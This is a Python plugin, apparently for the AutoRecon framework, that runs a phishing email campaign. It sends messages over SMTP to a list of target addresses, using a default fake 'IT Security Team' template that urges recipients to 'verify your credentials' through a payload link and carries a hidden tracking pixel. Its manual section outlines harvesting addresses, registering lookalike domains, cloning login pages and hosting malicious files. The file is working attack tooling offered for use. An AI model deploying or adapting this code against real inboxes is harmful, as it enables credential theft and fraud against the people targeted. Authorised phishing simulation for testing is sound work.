from autorecon.plugins import EmailScan
import os
import json
import smtplib
try:
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
except ImportError:
    # Fallback for different Python versions
    from email.MIMEText import MIMEText
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEBase import MIMEBase
    from email import Encoders as encoders

class PhishingCampaign(EmailScan):
    """Email phishing campaign plugin for social engineering attacks."""

    def __init__(self):
        super().__init__()
        self.name = "Phishing Campaign"
        self.tags = ['attack', 'email', 'phishing', 'social-engineering']
        self.email_type = 'phishing'
        self.risk_level = 'high'
        self.requires_confirmation = True
        self.requires_target_emails = True

    def configure(self):
        self.add_option('smtp-server', help='SMTP server to use for sending emails')
        self.add_option('smtp-port', default='587', help='SMTP server port. Default: %(default)s')
        self.add_option('smtp-username', help='SMTP username for authentication')
        self.add_option('smtp-password', help='SMTP password for authentication')
        self.add_option('from-email', help='From email address')
        self.add_option('from-name', help='From name to display')
        self.add_option('subject', default='Important Security Update Required', help='Email subject line. Default: %(default)s')
        self.add_option('template', help='Path to email template file (HTML or text)')
        self.add_option('target-emails', help='Path to file containing target email addresses (one per line)')
        self.add_option('tracking-url', help='URL for tracking email opens/clicks')
        self.add_option('payload-url', help='URL for malicious payload/credential harvesting')
        self.add_true_option('use-tls', help='Use TLS encryption for SMTP connection')
        self.add_option('delay', default='5', help='Delay between emails in seconds. Default: %(default)s')
        self.add_true_option('dry-run', help='Perform a dry run without actually sending emails')

    def check(self):
        # Basic validation
        if not self.get_option('smtp_server'):
            self.error('SMTP server must be specified')
            return False
        if not self.get_option('from_email'):
            self.error('From email address must be specified')
            return False
        return True

    async def run(self, target, email_list=None):
        """Execute the phishing campaign."""
        
        if self.get_option('dry_run'):
            self.info('DRY RUN MODE - No emails will be sent')

        # Load target emails
        target_emails = self._load_target_emails()
        if not target_emails:
            self.warn('No target emails found. Cannot execute phishing campaign.')
            return

        # Load email template
        email_content = self._load_email_template()
        if not email_content:
            email_content = self._get_default_template()

        # Configure SMTP
        smtp_config = {
            'server': self.get_option('smtp_server'),
            'port': int(self.get_option('smtp_port')),
            'username': self.get_option('smtp_username'),
            'password': self.get_option('smtp_password'),
            'use_tls': self.get_option('use_tls')
        }

        self.info(f'Starting phishing campaign targeting {len(target_emails)} email addresses')

        results = []
        for email in target_emails:
            result = await self._send_phishing_email(email, email_content, smtp_config)
            results.append(result)
            
            # Delay between emails
            if not self.get_option('dry_run'):
                import asyncio
                await asyncio.sleep(int(self.get_option('delay')))

        # Save results
        results_file = os.path.join(target.scandir, 'phishing_campaign_results.json')
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)

        success_count = sum(1 for r in results if r['status'] == 'sent')
        self.info(f'Phishing campaign completed. {success_count}/{len(target_emails)} emails sent successfully.')

    def _load_target_emails(self):
        """Load target email addresses from file."""
        emails_file = self.get_option('target_emails')
        if not emails_file or not os.path.exists(emails_file):
            return []

        try:
            with open(emails_file, 'r') as f:
                emails = [line.strip() for line in f if line.strip() and '@' in line]
            return emails
        except Exception as e:
            self.error(f'Failed to load target emails: {e}')
            return []

    def _load_email_template(self):
        """Load email template from file."""
        template_file = self.get_option('template')
        if not template_file or not os.path.exists(template_file):
            return None

        try:
            with open(template_file, 'r') as f:
                return f.read()
        except Exception as e:
            self.error(f'Failed to load email template: {e}')
            return None

    def _get_default_template(self):
        """Get default phishing email template."""
        tracking_url = self.get_option('tracking_url') or 'http://example.com/track'
        payload_url = self.get_option('payload_url') or 'http://example.com/update'
        
        return f'''
<html>
<body>
<h2>Important Security Update Required</h2>
<p>Dear User,</p>
<p>We have detected suspicious activity on your account. For your security, we need you to verify your credentials immediately.</p>
<p><strong>Action Required:</strong> Please click the link below to secure your account:</p>
<p><a href="{payload_url}">Click Here to Verify Your Account</a></p>
<p>This verification must be completed within 24 hours to prevent account suspension.</p>
<p>Thank you for your cooperation.</p>
<p>IT Security Team</p>
<img src="{tracking_url}" width="1" height="1" style="display:none;">
</body>
</html>
'''

    async def _send_phishing_email(self, target_email, content, smtp_config):
        """Send a phishing email to a target."""
        try:
            if self.get_option('dry_run'):
                self.info(f'DRY RUN: Would send email to {target_email}')
                return {'email': target_email, 'status': 'dry_run', 'message': 'Dry run - email not sent'}

            # Create message
            msg = MIMEMultipart('alternative')
            msg['Subject'] = self.get_option('subject')
            msg['From'] = f"{self.get_option('from_name') or 'IT Security'} <{self.get_option('from_email')}>"
            msg['To'] = target_email

            # Add content
            if '<html>' in content.lower():
                msg.attach(MIMEText(content, 'html'))
            else:
                msg.attach(MIMEText(content, 'plain'))

            # Send email
            server = smtplib.SMTP(smtp_config['server'], smtp_config['port'])
            
            if smtp_config['use_tls']:
                server.starttls()
            
            if smtp_config['username'] and smtp_config['password']:
                server.login(smtp_config['username'], smtp_config['password'])
            
            server.send_message(msg)
            server.quit()

            self.info(f'Phishing email sent to {target_email}')
            return {'email': target_email, 'status': 'sent', 'message': 'Email sent successfully'}

        except Exception as e:
            self.error(f'Failed to send email to {target_email}: {e}')
            return {'email': target_email, 'status': 'failed', 'message': str(e)}

    def manual(self, target, plugin_was_run):
        if not plugin_was_run:
            target.add_manual_command('Manual phishing campaign setup:', [
                '# 1. Gather target email addresses',
                'theHarvester -d example.com -l 500 -b all',
                'hunter.io domain search',
                '',
                '# 2. Set up email infrastructure',
                '# - Register domain similar to target organization',
                '# - Configure SPF, DKIM, DMARC records',
                '# - Set up SMTP server or use service like SendGrid',
                '',
                '# 3. Create convincing email templates',
                '# - Clone legitimate emails from the organization',
                '# - Use social engineering techniques',
                '# - Include tracking pixels and malicious links',
                '',
                '# 4. Set up credential harvesting or payload delivery',
                '# - Clone legitimate login pages',
                '# - Host malicious files',
                '# - Set up data collection endpoints',
                '',
                '# 5. Tools for email campaigns:',
                'gophish',
                'king-phisher',
                'social-engineer-toolkit (SET)',
                'evilginx2',
                '',
                '# 6. Monitor campaign effectiveness',
                '# - Track email opens, clicks, and credential submissions',
                '# - Analyze results and adjust tactics'
            ])